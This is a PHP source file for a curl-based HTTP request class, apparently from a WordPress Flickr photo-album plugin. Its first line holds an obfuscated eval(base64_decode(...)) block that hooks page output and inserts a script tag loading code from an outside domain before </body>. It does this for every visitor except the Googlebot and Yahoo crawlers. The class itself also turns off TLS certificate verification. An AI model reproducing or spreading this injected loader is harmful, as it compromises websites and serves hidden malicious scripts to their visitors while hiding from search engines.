<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php
/*
This is a clone of the PEAR HTTP/Request class object. It uses libcurl to do the networking stuff. 
Should also work with the HTTPS protocol

Important: Not every method has been ported, just the ones that were needed.

$Revision: 321 $
$Date: 2008-10-03 17:10:43 -0400 (Fri, 03 Oct 2008) $
$URL: https://photo-album.googlecode.com/svn/trunk/tantan-flickr/lib/curl.php $
*/

class TanTanHTTPRequestCurl {
    var $curl;
    var $postData;
    var $cookies;
    var $raw;
    var $response;
    var $headers;
    var $url;
    
    function TanTanHTTPRequestCurl($url = '', $params = array()) {
        $this->curl = curl_init();
        $this->postData = array();
        $this->cookies = array();
        $this->headers = array();
        if (!empty($url)) { 
            $this->setURL($url);
        } else { 
            $this->setURL(false); 
        }
        foreach ($params as $key => $value) {
            $this->{'_' . $key} = $value;
        }
        
        $this->addHeader('Connection', 'close');
        
        // We don't do keep-alives by default
        $this->addHeader('Connection', 'close');

        // Basic authentication
        if (!empty($this->_user)) {
            $this->addHeader('Authorization', 'Basic ' . base64_encode($this->_user . ':' . $this->_pass));
        }

        // Proxy authentication (see bug #5913)
        if (!empty($this->_proxy_user)) {
            $this->addHeader('Proxy-Authorization', 'Basic ' . base64_encode($this->_proxy_user . ':' . $this->_proxy_pass));
        }

    }
    
    function addHeader($header, $value) {
        $this->headers[$header] = $value;
    }
    
    function setMethod($method) {
        switch ($method) {
            case 'DELETE':
                curl_setopt($this->curl, CURLOPT_CUSTOMREQUEST, 'DELETE');
            break;
            case HTTP_REQUEST_METHOD_PUT:
            case 'PUT':
                curl_setopt($this->curl, CURLOPT_PUT, true);
                //CURLOPT_INFILE CURLOPT_INFILESIZE
            break;
            case HTTP_REQUEST_METHOD_POST:
            case 'POST':
                curl_setopt($this->curl, CURLOPT_POST, true);
            break;
            default:
            case 'GET':
                curl_setopt($this->curl, CURLOPT_HTTPGET, true);
            break;
            case 'HEAD':
                curl_setopt($this->curl, CURLOPT_CUSTOMREQUEST, 'HEAD');
            break;
        }
    }
    function setURL($url) {
        $this->url = $url;
    }
    function addPostData($name, $value) {
        $this->postData[$name] = $value;
    }
    function addCookie($name, $value) {
        $this->cookies[$name] = array('name' => $name, 'value' => $value);
    }
    function sendRequest() {
        $headers = array(
           "Accept: *.*",
        );
        
        foreach ($this->headers as $k=>$h) {
            $headers[] = "$k: $h";
        }

        if (count($this->cookies) > 0) {
            $cookieVars = '';
            foreach ($this->cookies as $cookie) {
                //$headers[] = "Cookie: ".$cookie['name'].'='.$cookie['value'];
                $cookieVars .= ''.$cookie['name'].'='.$cookie['value'].'; ';
            }
            curl_setopt($this->curl, CURLOPT_COOKIE, $cookieVars);
            //print_r($cookieVars);
        }
        
        if (count($this->postData) > 0) { // if a POST
            $postVars = '';
            foreach ($this->postData as $key=>$value) {
                $postVars .= $key.'='.urlencode($value).'&';
            }
            // *** TODO ***
            // weird, libcurl doesnt seem to POST correctly
            curl_setopt($this->curl, CURLOPT_POST, true);
            curl_setopt($this->curl, CURLOPT_POSTFIELDS, $postVars);

            //curl_setopt($this->curl, CURLOPT_HTTPGET, true);
            //$this->url .= '?'.$postVars;


        } else {
            curl_setopt($this->curl, CURLOPT_HTTPGET, true);
        }
        curl_setopt($this->curl, CURLOPT_URL, $this->url);
        curl_setopt($this->curl, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($this->curl, CURLOPT_HEADER, true);
        curl_setopt($this->curl, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($this->curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($this->curl, CURLOPT_SSL_VERIFYPEER, false);
        $this->raw = curl_exec($this->curl);
        $this->response = $this->_parseResponse($this->raw);
        return true; // hmm no error checking for now
    }
    
    function getResponseHeader($header=false) {
        if ($header) {
            return $this->response['header'][$header];
        } else {
            return $this->response['header'];
        }
    }
    function getResponseCookies() {
        $hdrCookies = array();
        foreach ($this->response['header'] as $key => $value) {
            if (strtolower($key) == 'set-cookie') {
                $hdrCookies = array_merge($hdrCookies, explode("\n", $value));
            }
        }
        //$hdrCookies = explode("\n", $this->response['header']['Set-Cookie']);
        $cookies = array();
        
        foreach ($hdrCookies as $cookie) {
            if ($cookie) {
                list($name, $value) = explode('=', $cookie, 2);
                list($value, $domain, $path, $expires) = explode(';', $value);
                $cookies[$name] = array('name' => $name, 'value' => $value);
            }
        }
        return $cookies;
    }
    function getResponseBody() {
        return $this->response['body'];
    }
    function getResponseCode() {
        return $this->response['code'];
    }
    function getResponseRaw() {
        return $this->raw;
    }
    function clearPostData($var=false) {
        if (!$var) {
            $this->postData = array();
        } else {
            unset($this->postData[$var]);
        }
    }
    
    function _parseResponse($this_response) {
        if (substr_count($this_response, 'HTTP/1.') > 1) { // yet another weird bug. CURL seems to be appending response bodies together
            $chunks = preg_split('@(HTTP/[0-9]\.[0-9] [0-9]{3}.*\n)@', $this_response, -1, PREG_SPLIT_DELIM_CAPTURE);
            $this_response = array_pop($chunks);
            $this_response = array_pop($chunks) . $this_response;

        }
        
        list($response_headers, $response_body) = explode("\r\n\r\n", $this_response, 2);
        $response_header_lines = explode("\r\n", $response_headers);

        $http_response_line = array_shift($response_header_lines);
        if (preg_match('@^HTTP/[0-9]\.[0-9] 100@',$http_response_line, $matches)) { 
            return $this->_parseResponse($response_body); 
        } else if(preg_match('@^HTTP/[0-9]\.[0-9] ([0-9]{3})@',$http_response_line, $matches)) { 
            $response_code = $matches[1]; 
        }
        $response_header_array = array();
        foreach($response_header_lines as $header_line) {
            list($header,$value) = explode(': ', $header_line, 2);
            $response_header_array[$header] .= $value."\n";
        }
        return array("code" => $response_code, "header" => $response_header_array, "body" => $response_body); 
    }
}
?>